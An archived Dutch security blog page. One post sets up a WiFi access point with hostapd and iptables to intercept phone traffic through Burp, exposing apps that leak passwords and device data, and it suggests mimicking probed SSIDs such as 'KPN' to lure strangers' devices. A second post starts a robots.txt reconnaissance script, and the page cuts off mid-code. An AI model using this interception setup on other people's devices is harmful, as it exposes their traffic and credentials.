@@ -1,0 +1,1161 @@
+```<!doctype html><!-- © 1998 - 2021 DPG Online Services B.V. -->
+<html lang="NL"><head>
+        
+                            <meta http-equiv="content-type" content="text/html; charset=utf-8">
+                                                <meta name="referrer" content="origin-when-cross-origin">
+                                                <meta name="description" content="Gewoon wat random brainfarts over de wondere wereld van &amp;quot;security&amp;quot;.">
+                            
+                    <title>./autopwn - Tweakers</title>
+        <link rel="navigator" title="Spring voorbij navigatie" href="https://autopwn.tweakblogs.net/#contentArea">
+
+            <link rel="preload" href="https://tweakers.net/x/fonts/IBMPlexSansCondensed-Regular.woff2" as="font" type="font/woff2" crossorigin>
+            <link rel="preload" href="https://tweakers.net/x/fonts/IBMPlexSansCondensed-SemiBold.woff2" as="font" type="font/woff2" crossorigin>
+
+                                            <link rel="shortcut icon" href="https://tweakers.net/favicon.ico" type="image/x-icon">
+                            <link rel="alternate" title="./autopwn - Reacties" type="application/rss+xml" href="https://autopwn.tweakblogs.net/feed/comments">
+                            <link rel="alternate" title="./autopwn" type="application/rss+xml" href="https://autopwn.tweakblogs.net/feed/">
+            
+        <script>
+                var relaxedDomain  = 'tweakers.net',
+                    tweakersConfig = {"BaseURL":"https:\/\/autopwn.tweakblogs.net\/","TnetBaseURL":"https:\/\/tweakers.net\/","ForumBaseURL":"https:\/\/gathering.tweakers.net\/","ImgURL":"https:\/\/tweakers.net\/","sidName":"__Secure-TnetID","UserID":0,"requestId":"Twk-eun-web3_200.3.5_28706_60114921cb1844.75028885","abStatsPath":"\/ajax\/7aoepIikoTnbngVWrzOTL77yPd\/","loginJs":"https:\/\/tweakers.net\/x\/scripts\/min\/login.js?1605690650","loginCss":"https:\/\/tweakers.net\/x\/styles\/profiles\/login.css?1583238942","clickToLoad":false};
+
+                try
+                {
+                    document.domain = relaxedDomain;
+                }
+                catch (e)
+                {
+                    relaxedDomain = '';
+                }
+                document.documentElement.className = 'js';
+            </script>
+        <link rel="stylesheet" href="https://tweakers.net/x/styles/tweakblogs/weblogs.css?1608112821" type="text/css">
+                                                    <style type="text/css">#banner h1, #banner .subtitle {
+	display: none;
+}
+#reacties .ownreply {
+	background-color: #FFFFFF;
+	border: 1px solid #000000;
+	padding: 3px;
+}
+
+                        </style>
+                        <script src="https://tweakers.net/x/build/runtime.f4fad719.js"></script><script src="https://tweakers.net/x/build/0.3c968efc.js"></script><script src="https://tweakers.net/x/build/1.fe0b8bdd.js"></script><script src="https://tweakers.net/x/build/frontpage.aad0f1fd.js"></script>
+
+                    <script src="https://tweakers.net/x/scripts/min/general.js?1605696722"></script>
+            <script src="https://tweakers.net/x/scripts/min/weblogs.js?1604565751"></script>
+            <script src="https://tweakers.net/x/scripts/min/rml_toolbar.js?1605522743"></script>
+                    <script>
+            var _wtq=[['_init',{"randomId":"670671285720342","trackId":"318816705845986","trackDomain":"tweakers.net","domain":"tweakers.net;gathering.tweakers.net","cookie":"1","mediaCode":"wt_mc","contentId":"","contentGroup":{"1":"tweakers.net","2":"Tweakblogs"},"executePluginFunction":"wt_urlCampaignMapper;wt_stats_plugin","requestObfuscation":true,"customParameter":{"1":"LG"}}],['_trackPage']];
+			loadJS('https://tweakers.net/x/scripts/min/zH4Uvz.js',AbStats.wtCallBack);
+
+        </script>
+    
+    </head>
+    <body>
+
+    <div id="container">    <div id="tweakblogsNav">
+        <div class="logo"><a href="https://tweakblogs.net/"><img src="https://tweakers.net/g/if/weblogs/tweakblogs.png" width=131 height=20 alt="Tweakblogs"></a></div>
+        <ul>
+            <li><a href="https://tweakblogs.net/">Tweakblogs Home</a></li>
+            <li><a href="https://tweakers.net/">Tweakers</a></li>
+                            <li>
+                    <a href="https://tweakers.net/nieuws/">Nieuws</a>
+                </li>
+                            <li>
+                    <a href="https://tweakers.net/reviews/">Reviews</a>
+                </li>
+                            <li>
+                    <a href="https://tweakers.net/pricewatch/">Pricewatch</a>
+                </li>
+                            <li>
+                    <a href="https://tweakers.net/aanbod/">Vraag &amp; Aanbod</a>
+                </li>
+                            <li>
+                    <a href="https://gathering.tweakers.net/">Forum</a>
+                </li>
+                            <li>
+                    <a href="https://tweakers.net/carriere/">Carri&egrave;re</a>
+                </li>
+                            <li>
+                    <a href="#">Meer</a>
+                </li>
+                    </ul>
+    </div>
+    <div id="banner">
+    
+        
+    <h1><a href="https://autopwn.tweakblogs.net">./autopwn</a></h1>
+            <span class="subtitle"></span>
+    </div>
+            <p class="breadCrumb">
+                <a href="https://autopwn.tweakblogs.net/feed/" title="./autopwn" rel="nofollow">
+            <img src="https://tweakers.net/g/if/v2/icons/rss_small.png" width=12 height=12 alt="[RSS]">
+        </a>
+                                <a href="https://autopwn.tweakblogs.net">            Home            </a>
+            </p>
+<div id="pagebody">
+                <div class="columnwrapper normal">    <div class="content">
+			<div class="blogpost">
+				<h2><a href="https://autopwn.tweakblogs.net/blog/9157/droid-in-the-middle.html">Droid in the middle</a></h2>
+				<p class="author">
+					Door <a href="https://tweakers.net/gallery/98264/" rel="nofollow">Slurpgeit</a> op vrijdag 12 juli 2013 00:15 - <a href="https://autopwn.tweakblogs.net/blog/9157/droid-in-the-middle.html#reacties">Reacties (16)</a><br>Categorie: -, Views: 8.182
+				</p>
+				<div class="article">Aangezien ik de laatste paar dagen druk bezig ben geweest met het verkeer van mobiele devices onderscheppen, leek het me wel leuk om hier een verhaaltje over te tikken. Vooral ook omdat er soms echt rare dingen gebeuren op de achtergrond.<br>
+<br>
+Zoals altijd gebruik ik ook dit keer weer een Ubuntu 12.04 VM, samen met een HTC Desire met een Cyanogenmod 10.1 rom (Android 4.2.2). Op Ubuntu ga ik wat software installeren om er een WiFi Access Point van te maken. Als adapter heb ik een Alfa (<a href="http://www.ebay.nl/itm/Alfa-AWUS036NH-2000mw-USB-5dbi-Antenna-U-Mount-Ralink-/190521870971?pt=DE_Computing_USB_WLAN_Adapter_Dongles&amp;hash=item2c5bfd0a7b#ht_6031wt_1139" rel="external nofollow">deze</a>).<br>
+<br>
+Eerst, wat software installeren:<br>
+<div class="cmd"><pre>sudo apt-get -y install hostapd isc-dhcp-server</pre></div><br>
+Hostapd is software voor het opzetten van een access point, en isc-dhcp-server is, zoals de naam misschien al doet vermoeden, een DHCP server. Na de installatie, zorg ik er ook gelik voor dat hostapd niet elke keer automatisch opstart als het systeem dat doet:<br>
+<div class="cmd"><pre>sudo update-rc.d hostapd disable</pre></div><br>
+Vervolgens maak ik een configuratie aan voor hostapd, waar ik wat settings over mijn access point in zit:<br>
+<div class="cmd"><pre>sudo nano /etc/hostapd.conf</pre></div><br>
+<div class="code">code:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="phphighlightcode"><div><pre>ssid=Henk
+channel=1
+wpa=2
+wpa_passphrase=qwertyuiop
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+interface=wlan0
+driver=nl80211
+hw_mode=g</pre></div></td></tr></table></div><br>
+Deze settings zorgen voor een Access Point met als SSID 'Henk' op kanaal 1, met WPA2-AES en als sleutel 'qwertyuiop'. Dit alles gaat gebeuren op de interface wlan0 (Mijn Alfa).<br>
+<br>
+Hierna is het ook nog nodig om een configuratie voor de DHCP server te maken. Eerst gooi ik de oude weg, dit is toch maar een example config die veel te vol staat met allerlei rotzooi:<br>
+<div class="cmd"><pre>sudo rm /etc/dhcp/dhcpd.conf</pre></div><br>
+Vervolgens open ik daar een nieuw bestand:<br>
+<div class="cmd"><pre>sudo nano /etc/dhcp/dhcpd.conf</pre></div><br>
+en gooi ik er deze informatie in:<br>
+<div class="code">code:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+2
+3
+4
+5
+</pre></td><td class="phphighlightcode"><div><pre>subnet 10.0.0.0 netmask 255.255.255.0 {
+  range 10.0.0.100 10.0.0.149;
+  option domain-name-servers 8.8.8.8, 8.8.4.4;
+  option routers 10.0.0.1;
+}</pre></div></td></tr></table></div> (ja, /24 op een 10.x.x.x netwerk is met opzet <img src="https://tweakers.net/g/s/vork.gif" width="20" height="15" alt=":Y)">)<br>
+Hiermee deelt mijn DHCP server adressen uit van 10.0.0.100 tot 10.0.0.149, met als DNS servers die van Google, en mijn Ubuntu VM als default gateway. Hiervoor moet ik nog wel even mijn WiFi adapter het goede adres geven:<br>
+<div class="cmd"><pre>sudo ifconfig wlan0 10.0.0.1/24</pre></div><br>
+Ook is het nodig om de DHCP server te vertellen welke interface hij moet gebruiken. Dus doe ik:<br>
+<div class="cmd"><pre>sudo nano /etc/default/isc-dhcp-server</pre></div><br>
+en verander ik<br>
+<div class="code">code:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre>INTERFACES=&quot;&quot;</pre></div></td></tr></table></div><br>
+naar<br>
+<div class="code">code:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre>INTERFACES=&quot;wlan0&quot;</pre></div></td></tr></table></div><br>
+Om ervoor te zorgen dat alles goed gaat, is het nodig om IP forwarding in te schakelen:<br>
+<div class="cmd"><pre>sudo sysctl net.ipv4.ip_forward=1</pre></div><br>
+en om wat firewall regels toe te passen<br>
+<div class="cmd"><pre>
+sudo iptables -A FORWARD -s 10.0.0.0/24 -i wlan0 -o eth0 -j ACCEPT
+sudo iptables -A FORWARD -d 10.0.0.0/24 -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+sudo iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE
+</pre></div><br>
+Dan even de DHCP server starten:<br>
+<div class="cmd"><pre>sudo service isc-dhcp-server start</pre></div><br>
+en het Access Point de lucht in schoppen<br>
+<div class="cmd"><pre>sudo hostapd hostapd.conf</pre></div><br>
+Dat lijkt allemaal prima te werken. Ik kan verbinden en lekker surfen:<br>
+<br>
+<img src="https://tweakers.net/camo/3aebf1a6c38b39a9d663421920e98eeaeca93607/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Fhenk_ap.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/henk_ap.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/henk_ap.png"><br>
+<br>
+Een grappig iets om te herinneren is dat (zoals ik al eens <a href="https://autopwn.tweakblogs.net/blog/archief/2012/12/" rel="external">eerder heb besproken</a>), een WiFi enabled apparaat constant zoekt naar netwerken waar je ooit mee verbonden bent (mits je ze niet handmatig verwijderd hebt, iets wat bij iOS devices alleen kan als ze in de buurt zijn.). Deze &quot;probes&quot; kan je opvangen om te zien waar zoal naar gezocht wordt. Als er bijvoorbeeld in mijn buurt  iemand zoekt naar de open hotspot &quot;KPN&quot;, en ik noem mijn Access Point geen &quot;Henk&quot; maar &quot;KPN&quot;, dan zal die persoon automatisch verbinden met mijn Access Point zonder het door te hebben. Maar wat voor verkeer zie je zoal langskomen?<br>
+<br>
+Om dat wat inzichtelijker te maken gebruik ik <a href="http://portswigger.net/" rel="external nofollow">Burp</a>. Een zogenaamde intercepting proxy, waarbij je alle HTTP(s) requests kan zien, en aanpassen. Hiervoor moet alleen wel het verkeer op poort 80 (HTTP) en 443 (HTTPS)omgelust worden naar die proxy (Die luistert naar verkeer op poort 8080. Dat is vrij simpel te doen:<br>
+<div class="cmd"><pre>sudo iptables -t nat -A PREROUTING -i wlan0 -s 10.0.0.0/24 -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -i wlan0 -s 10.0.0.0/24 -p tcp --dport 443 -j REDIRECT --to-port 8080
+sudo iptables -A INPUT -i wlan0 -s 10.0.0.0/24 -p tcp --dport 8080 -j ACCEPT</pre></div><br>
+En even in stellen dat Burp op alle interfaces gaat luisteren:<br>
+<br>
+<img src="https://tweakers.net/camo/a41528740101e7bec46c6feeefe29bc749edbb2f/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Fburp_listen.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/burp_listen.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/burp_listen.png"><br>
+<br>
+Als je verkeer gaat onderscheppen van devices die niet weten dat ze door een proxy geleid gaan worden, is ook het vinkje &quot;Invisible mode&quot; erg belangrijk:<br>
+<br>
+<img src="https://tweakers.net/camo/ab27732d732edc859cad5d0f5caba00aaaaa3729/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Finvisible.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/invisible.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/invisible.png"><br>
+<br>
+En zo kan je in ieder geval al het HTTP verkeer zien van de client. Zoals bijvoorbeeld een bezoek naar tweakers.net op de telefoon:<br>
+<br>
+<img src="https://tweakers.net/camo/2315ca272c3f33df4359820c2eb6c649de04f964/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Freq_t.net.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/req_t.net.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/req_t.net.png"><br>
+<br>
+Daarnaast wordt ook al het SSL verkeer door de proxy gestuurd, maar omdat Burp dit ontsleuteld en weer versleuteld met een eigen certificaat zal dit zorgen voor een certificaatwaarschuwing of een niet werkende app (In het goede geval). Bij de tweakers.net app was dit ook het geval. Deze wil (mits er inloggegevens ingevoerd staan in de app) geen content ophalen vanwege een ongeldig SSL certificaat. Kudo's tweakers! Helaas doet het relatief populaire spelletje &quot;Draw Something&quot; daar minder moeilijk over. Bij de eerste run van het spel wordt het device automatisch geregistreerd. Via SSL, dat wel, maar het maakt de app geen klap uit wat voor certificaat daarbij hoort. Resultaat:<br>
+<br>
+<img src="https://tweakers.net/camo/bb1d1c83e3095c92d7eec15767d78c2ae1991b68/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Fds.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/ds.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/ds.png"><br>
+<br>
+Kassa! Eerste wachtwoord is binnen. Eens kijken wat andere populaire games doen. Kent iemand &quot;4 plaatjes 1 woord&quot;? Zij jou wel:<br>
+<br>
+<img src="https://tweakers.net/camo/75d35991ff90522821eb8f8de8206a70e69102d3/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2F4p1w.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/4p1w.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/4p1w.png"><br>
+<br>
+Nu heb ik op dit toestel eigenlijk alles kwa locatiebepaling uit staan, en zo weinig mogelijk gegevens ingevoerd. Maar zo te zien willen ze best wat van je weten. Positie, geslacht, leeftijd, serienummers, MAC adressen, verbindingsmethode, etc, etc. En dat alleen maar voor een advertentie? Gelukkig versturen ze het versleuteld over het internet, oh, wacht, niet. Even verder kijken..<br>
+<br>
+Coindozer! WIe houdt er niet van een beetje muntje schuiven. Maar, wat de hell dit allemaal moet voorstellen:<br>
+<br>
+<img src="https://tweakers.net/camo/08b3c6defebc5d0c8b30169b9a64cb73a21d7d08/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Fcoindozer.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/coindozer.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/coindozer.png"><br>
+<br>
+Dat nummer daar achter &quot;Type 3&quot; lijkt verdacht veel op het IMEI van de telefoon. En waar is in godsnaam de &quot;ishacked&quot; parameter voor? Root detectie? Not doing a very good job <img src="https://tweakers.net/g/s/smile.gif" width="15" height="15" alt=":)">. Moving on..<br>
+<br>
+We komen aan bij &quot;Stick Stunt Biker 2&quot;. En bij de eerste run al gelijk wat interessants:<br>
+<br>
+<img src="https://tweakers.net/camo/2f7b47dc8e434a6ea1ce696c8e0655e373350f0d/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Fstunt.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/stunt.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/stunt.png"><br>
+<br>
+Die grote blob tekst is misschien wat duidelijk, maar hier is ie met enters en ontdaan van URL encoding:<br>
+<div class="code">code:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+</pre></td><td class="phphighlightcode"><div><pre>packages=android
+com.andrew.apollo
+com.android.backupconfirm
+com.android.bluetooth
+com.android.browser
+com.android.calculator2
+com.android.calendar
+com.android.cellbroadcastreceiver
+com.android.certinstaller
+com.android.contacts
+com.android.defcontainer
+com.android.deskclock
+com.android.development
+com.android.dreams.basic
+com.android.dreams.phototable
+com.android.email
+com.android.exchange
+com.android.galaxy4
+com.android.gallery3d
+com.android.htmlviewer
+com.android.inputdevices
+com.android.inputmethod.latin
+com.android.keychain
+com.android.location.fused
+com.android.magicsmoke
+com.android.mms
+com.android.musicvis
+com.android.noisefield
+com.android.packageinstaller
+com.android.phasebeam
+com.android.phone
+com.android.providers.applications
+com.android.providers.calendar
+com.android.providers.contacts
+com.android.providers.downloads
+com.android.providers.downloads.ui
+com.android.providers.drm
+com.android.providers.media
+com.android.providers.settings
+com.android.providers.telephony
+com.android.providers.userdictionary
+com.android.provision
+com.android.settings
+com.android.sharedstoragebackup
+com.android.smspush
+com.android.soundrecorder
+com.android.stk
+com.android.systemui
+com.android.vending
+com.android.voicedialer
+com.android.vpndialogs
+com.android.wallpaper.holospiral
+com.android.wallpaper.livepicker
+com.bel.android.dspmanager
+com.cyanogenmod.lockclock
+com.cyanogenmod.trebuchet
+com.cyanogenmod.updater
+com.djinnworks.StickStuntBiker2.free
+com.google.android.apps.uploader
+com.google.android.backup
+com.google.android.ears
+com.google.android.feedback
+com.google.android.gm
+com.google.android.gms
+com.google.android.gsf
+com.google.android.gsf.login
+com.google.android.location
+com.google.android.marvin.talkback
+com.google.android.onetimeinitializer
+com.google.android.partnersetup
+com.google.android.setupwizard
+com.google.android.syncadapters.bookmarks
+com.google.android.syncadapters.calendar
+com.google.android.syncadapters.contacts
+com.google.android.talk
+com.google.android.voicesearch
+com.hyperkani.stuntcarchallenge
+com.icemobile.tweakers
+com.king.candycrushsaga
+com.leftover.CoinDozer
+com.omgpop.dstfree
+com.supportware.Buienradar
+com.svox.pico
+com.tmobile.themechooser
+com.tmobile.thememanager
+com.zynga.draw2.googleplay.free
+de.lotum.whatsinthefoto.us
+jackpal.androidterm
+net.cactii.flash2</pre></div></td></tr></table></div><br>
+Eh? Ik kan me geen geldige reden bedenken waarom een provider van advertenties een lijst moet hebben van ALLE apps die op mijn telefoon staan. En al helemaal niet waarom ze dat onversleuteld versturen (En ja, ook hier staat mijn Device ID in het request). Toen ik echter verder ging testen bleek het echter nog erger. De app draaide niet, en ik installeerde de ING app. Tot mijn grote verbazing zie ik:<br>
+<br>
+<img src="https://tweakers.net/camo/ab837617888b7ebceb8dcc30699c0dd2b58df589/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Fstunt2.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/stunt2.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/stunt2.png"><br>
+<br>
+Kan iemand mij vertellen waarom een simpel spelletje elke andere app die ik installeer doorbelt? <br>
+<br>
+<span class="me">* Slurpgeit zet tin foil hat op.</span> <br>
+<br>
+One more time for dramatic effect, dit is dus allemaal zonder een nieuw root certificaat op het apparaat te installeren, of tools als SSLStrip. Je maakte je druk om PRISM? Maak je liever druk om je eigen broekzak.<br>
+<br>
+Uiteraard is dit soort onderzoek heel erg goed zelf uit te voeren. Het is best makkelijk om het CA certificaat van Burp op je toestel te installeren, gewoon even het certificaat exporteren met een browser, opslaan als .crt op de root van je SD kaart, en:<br>
+<br>
+<img src="https://tweakers.net/camo/47b1ab8849758980722b5381babdeae1eefc37dc/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2FCA1.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/CA1.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/CA1.png"><br>
+<img src="https://tweakers.net/camo/55e58cd18a6c6be263b4a5b9d1ad0bdd065596e4/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2FCA2.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/CA2.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/CA2.png"><br>
+<img src="https://tweakers.net/camo/b92434bde7159221a1dc449737d26785a0f74a60/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2FCA3.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/CA3.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/CA3.png"><br>
+<br>
+Daarnaast is het ook wel handig om op het toestel een proxy in te stellen, zodat Burp de juiste certificaten kan genereren per website:<br>
+<br>
+<img src="https://tweakers.net/camo/974ad43a4a919e0a3809f0cf5bee5bb5001e1494/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Fditm%2Fproxy.png" class="rml border" alt="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/proxy.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/ditm/proxy.png"><br>
+<br>
+Als laatste heb je ook nog apps die doen aan &quot;Certificate pinning&quot;. Oftewel, ze accepteren alleen het certificaat dat ergens in de code gedefiniëerd staat. Hier zijn echter ook programma's voor, zoals: <a href="https://github.com/iSECPartners/android-ssl-bypass" rel="external nofollow">https://github.com/iSECPartners/android-ssl-bypass</a> en <a href="https://code.google.com/p/intrinsec-android-ssl-patch/" rel="external nofollow">https://code.google.com/p/intrinsec-android-ssl-patch/</a>.<br>
+<br>
+Ik wilde nog een stuk bij dit blog maken over wat apps allemaal versturen als ze gepatched zijn om alle SSL certificaten te accepteren, of als ik het Burp CA certificaat op het toestel had gezet. Bij nader inzien leek het me echter wel leuk om dat aan jouw verbeelding over te laten, en misschien een beetje te triggeren om zelf op onderzoek uit te gaan <img src="https://tweakers.net/g/s/wink.gif" width="15" height="15" alt=";)">. De resultaten van hierboven zijn overigens niet meer dan een paar uur onderzoek. Ik ga even het huis verven met loodverf, want er verschijnen allemaal busjes met schotels op het dak voor de deur.</div>
+			</div>
+			<div class="blogpost">
+				<h2><a href="https://autopwn.tweakblogs.net/blog/9112/robots-punt-txt.html">robots.txt</a></h2>
+				<p class="author">
+					Door <a href="https://tweakers.net/gallery/98264/" rel="nofollow">Slurpgeit</a> op dinsdag  2 juli 2013 00:23 - <a href="https://autopwn.tweakblogs.net/blog/9112/robots-punt-txt.html#reacties">Reacties (12)</a><br>Categorie: -, Views: 8.120
+				</p>
+				<div class="article">Klein dumppostje tussendoor. Leek me eigenlijk wel een goed idee om een scriptje te maken wat automatisch de robots.txt van een website doorloopt om te kijken of er nog spannende pagina's tussen staan. Wie weet heeft iemand anders er nog wat aan <img src="https://tweakers.net/g/s/wink.gif" width="15" height="15" alt=";)">. Overigens ben ik absoluut geen coder, dus verwacht een paar schoonheidsfoutjes.<br>
+<br>
+<img src="https://tweakers.net/camo/1ba6dcc3fad0e7372d99f1b03c62be93b5fd7f75/?url=https%3A%2F%2Fdl.dropboxusercontent.com%2Fu%2F7521450%2Fblog%2Frobots%2F2-7-2013%25200-20-54.png" class="rml" alt="https://dl.dropboxusercontent.com/u/7521450/blog/robots/2-7-2013%200-20-54.png" title="https://dl.dropboxusercontent.com/u/7521450/blog/robots/2-7-2013%200-20-54.png"><br>
+<br>
+<div class="code">Python:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_ch">#!/usr/bin/env python</span>
+
+<span class="code_c1">#############################################</span>
+<span class="code_c1"># GetRobots - Get titles for all            #</span>
+<span class="code_c1"># robots.txt URI&#39;s.                         #</span>
+<span class="code_c1"># Author: Slurpgeit                         #</span>
+<span class="code_c1"># Github: https://github.com/Slurpgeit      #</span>
+<span class="code_c1">#############################################</span>
+
+<span class="code_c1">## Imports</span>
+<span class="code_kn">import</span> <span class="code_nn">sys</span>
+<span class="code_kn">import</span> <span class="code_nn">urllib2</span>
+<span class="code_kn">import</span> <span class="code_nn">time</span>
+<span class="code_kn">import</span> <span class="code_nn">socket</span>
+
+<span class="code_c1"># Check for BeautifulSoup</span>
+<span class="code_k">try</span><span class="code_p">:</span>
+    <span class="code_kn">from</span> <span class="code_nn">bs4</span> <span class="code_kn">import</span> <span class="code_n">BeautifulSoup</span>
+<span class="code_k">except</span><span class="code_p">:</span>
+    <span class="code_k">print</span> <span class="code_s1">&#39;Please install the BS4 python module.&#39;</span>
+    <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">exit</span><span class="code_p">()</span>
+
+<span class="code_c1">## Basic stuff</span>
+<span class="code_c1"># The helptext</span>
+<span class="code_n">helptext</span> <span class="code_o">=</span> <span class="code_s2">&quot;&quot;&quot;</span><span class="code_se">\</span>
+<span class="code_s2">==========</span><span class="code_se">\n\</span>
+<span class="code_s2">GetRobots</span><span class="code_se">\n\</span>
+<span class="code_s2">==========</span><span class="code_se">\n\</span>
+<span class="code_s2">Usage: &quot;&quot;&quot;</span> <span class="code_o">+</span> <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">[</span><span class="code_mi">0</span><span class="code_p">]</span> <span class="code_o">+</span> <span class="code_s2">&quot;&quot;&quot; -u &lt;url&gt; &lt;options&gt;</span><span class="code_se">\n\</span>
+<span class="code_s2">    -u &lt;url&gt;        The URL to use</span><span class="code_se">\n\</span>
+<span class="code_s2">    -P &lt;ip&gt;:&lt;port&gt;      Use HTTP proxy</span><span class="code_se">\n\</span>
+<span class="code_s2">    -t &lt;timeout&gt;        Timeout (Default is 1 second)</span>
+<span class="code_s2">    -v          Verbose (Show HTTP errors)</span>
+<span class="code_s2">    -h          Display this help</span><span class="code_se">\</span>
+<span class="code_s2">&quot;&quot;&quot;</span>
+
+<span class="code_c1"># See if URL is set</span>
+<span class="code_k">try</span><span class="code_p">:</span>
+    <span class="code_n">url</span> <span class="code_o">=</span> <span class="code_n">urllib2</span><span class="code_o">.</span><span class="code_n">unquote</span><span class="code_p">(</span><span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_p">[</span><span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">argv</span><span class="code_o">.</span><span class="code_n">index</span><span class="code_p">(</span><span class="code_s1">&#39;-u&#39;</span><span class="code_p">)</span> <span class="code_o">+</span> <span class="code_mi">1</span><span class="code_p">])</span>
+    <span class="code_k">if</span> <span class="code_p">(</span><span class="code_s1">&#39;http://&#39;</span> <span class="code_ow">not</span> <span class="code_ow">in</span> <span class="code_n">url</span><span class="code_p">)</span> <span class="code_ow">and</span> <span class="code_p">(</span><span class="code_s1">&#39;https://&#39;</span> <span class="code_ow">not</span> <span class="code_ow">in</span> <span class="code_n">url</span><span class="code_p">):</span>
+        <span class="code_n">url</span> <span class="code_o">=</span> <span class="code_s1">&#39;http://&#39;</span> <span class="code_o">+</span> <span class="code_n">url</span>
+<span class="code_k">except</span><span class="code_p">:</span>
+    <span class="code_k">print</span> <span class="code_n">helptext</span>
+    <span class="code_n">sys</span><span class="code_o">.</span><span class="code_n">exit</span><span class="code_p">()</span>
+
+<span class="code_c1"># Check if URL resolves</span>
+<span class="code_k">try</span><span class="code_p">:</span>
+    <span class="code_n">rawurl</span> <span class="code_o">=</span> <span class="code_n">url</span><span class="code_o">.</span><span class="code_n">strip</span><span class="code_p">(</span><span class="code_s1">&#39;http://&#39;</span><span class="code_p">)</span>
